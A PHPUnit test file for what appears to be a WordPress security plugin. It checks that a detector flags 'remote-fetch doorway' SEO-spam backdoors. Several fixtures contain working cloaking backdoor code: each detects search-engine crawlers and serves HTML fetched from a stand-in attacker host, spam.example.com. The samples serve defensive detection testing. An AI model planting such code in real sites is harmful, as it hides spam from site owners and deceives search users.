<?php
/**
 * Remote-fetch doorway generator detection tests — SEO Spam Detector.
 *
 * The most common modern Japanese/Chinese SEO-spam backdoor keeps no spam
 * content in the file: at request time it detects a crawler, fetches spam HTML
 * from an attacker-controlled server, and serves it. These tests lock the
 * behaviour-based, prefix-agnostic detection of that pattern.
 *
 * @package TurboGuard\Tests\Unit\SeoSpamDetector
 */

declare(strict_types=1);

namespace TurboGuard\Tests\Unit\SeoSpamDetector;

use PHPUnit\Framework\TestCase;
use ReflectionMethod;
use Turbo_Guard_SEO_Spam_Detector;

/**
 * Tests for looks_like_remote_fetch_doorway() and its integration into
 * looks_like_doorway_generator().
 */
class RemoteFetchDoorwayTest extends TestCase {

	/**
	 * A classic remote-fetch doorway (file_get_contents + Googlebot + numeric
	 * route + echo/exit) must be detected.
	 */
	public function test_remote_fetch_doorway_with_file_get_contents_is_detected(): void {
		$php = <<<'PHP'
<?php
add_action('template_redirect', function () {
    $ua = $_SERVER['HTTP_USER_AGENT'];
    if (false === strpos($ua, 'Googlebot')) {
        return;
    }
    $uri = $_SERVER['REQUEST_URI'];
    if (!preg_match('#^/products/(\d+)/?$#', $uri, $m)) {
        return;
    }
    $html = file_get_contents('https://spam.example.com/fetch?id=' . $m[1]);
    echo $html;
    exit;
});
PHP;

		$this->assertTrue(
			self::invoke_looks_like_remote_fetch_doorway( $php ),
			'A remote-fetch doorway (bot UA + numeric route + file_get_contents + echo/exit) must be detected.'
		);
	}

	/**
	 * A remote-fetch doorway using wp_remote_get (a backdoor that runs inside
	 * WordPress) must be detected.
	 */
	public function test_remote_fetch_doorway_with_wp_remote_get_is_detected(): void {
		$php = <<<'PHP'
<?php
add_action('template_redirect', function () {
    if (strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') === false) {
        return;
    }
    $id = isset($_GET['id']) ? $_GET['id'] : '';
    if (!preg_match('/^\d{6,}$/', $id)) {
        return;
    }
    $resp = wp_remote_get('https://spam.example.com/' . $id);
    echo wp_remote_retrieve_body($resp);
    die;
});
PHP;

		$this->assertTrue(
			self::invoke_looks_like_remote_fetch_doorway( $php ),
			'A remote-fetch doorway using wp_remote_get must be detected.'
		);
	}

	/**
	 * A curl-based remote-fetch doorway must be detected.
	 */
	public function test_remote_fetch_doorway_with_curl_is_detected(): void {
		$php = <<<'PHP'
<?php
if (isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/google|bing|yandex|baidu|spider|bot/i', $_SERVER['HTTP_USER_AGENT'])) {
    $id = isset($_REQUEST['id']) ? (int) $_REQUEST['id'] : 0;
    if ($id > 100000) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'http://spam.example.com/page/' . $id);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        echo curl_exec($ch);
        curl_close($ch);
        exit;
    }
}
PHP;

		$this->assertTrue(
			self::invoke_looks_like_remote_fetch_doorway( $php ),
			'A curl-based remote-fetch doorway must be detected.'
		);
	}

	/**
	 * A legitimate plugin that fetches remote content but does NOT cloak for
	 * bots must NOT be flagged.
	 */
	public function test_legit_remote_fetch_without_bot_cloak_is_not_detected(): void {
		$php = <<<'PHP'
<?php
function fetch_license_status() {
    $resp = wp_remote_get('https://api.example.com/license');
    if (is_wp_error($resp)) {
        return false;
    }
    return wp_remote_retrieve_body($resp);
}
PHP;

		$this->assertFalse(
			self::invoke_looks_like_remote_fetch_doorway( $php ),
			'A plugin that fetches remote content without bot cloaking must not be flagged.'
		);
	}

	/**
	 * A file that detects bots but does NOT fetch remote content must NOT be
	 * flagged (e.g. a legitimate analytics/caching helper).
	 */
	public function test_bot_check_without_remote_fetch_is_not_detected(): void {
		$php = <<<'PHP'
<?php
function is_crawler() {
    $ua = $_SERVER['HTTP_USER_AGENT'];
    return (bool) preg_match('/googlebot|bingbot|spider|crawler/i', $ua);
}
PHP;

		$this->assertFalse(
			self::invoke_looks_like_remote_fetch_doorway( $php ),
			'A file that checks bots but does not fetch remote content must not be flagged.'
		);
	}

	/**
	 * Integration: looks_like_doorway_generator() must flag a remote-fetch
	 * doorway that has no CJK text, no base64 payload, no rewrite rule and no
	 * CJK variable names — the exact gap the remote-fetch detection closes.
	 */
	public function test_doorway_generator_flags_remote_fetch_backdoor(): void {
		$php = <<<'PHP'
<?php
add_action('template_redirect', function () {
    $ua = $_SERVER['HTTP_USER_AGENT'];
    if (false === strpos($ua, 'Googlebot')) {
        return;
    }
    $uri = $_SERVER['REQUEST_URI'];
    if (!preg_match('#^/products/(\d+)/?$#', $uri, $m)) {
        return;
    }
    echo file_get_contents('https://spam.example.com/fetch?id=' . $m[1]);
    exit;
});
PHP;

		$this->assertTrue(
			self::invoke_looks_like_doorway_generator( $php ),
			'looks_like_doorway_generator() must flag a remote-fetch doorway backdoor.'
		);
	}

	// ──────────────────────────────────────────────────────────────────────────
	// Helpers
	// ──────────────────────────────────────────────────────────────────────────

	private static function invoke_looks_like_remote_fetch_doorway( string $content ): bool {
		$method = new ReflectionMethod( Turbo_Guard_SEO_Spam_Detector::class, 'looks_like_remote_fetch_doorway' );
		$method->setAccessible( true );
		return (bool) $method->invoke( null, $content );
	}

	private static function invoke_looks_like_doorway_generator( string $content ): bool {
		$method = new ReflectionMethod( Turbo_Guard_SEO_Spam_Detector::class, 'looks_like_doorway_generator' );
		$method->setAccessible( true );
		return (bool) $method->invoke( null, $content );
	}
}
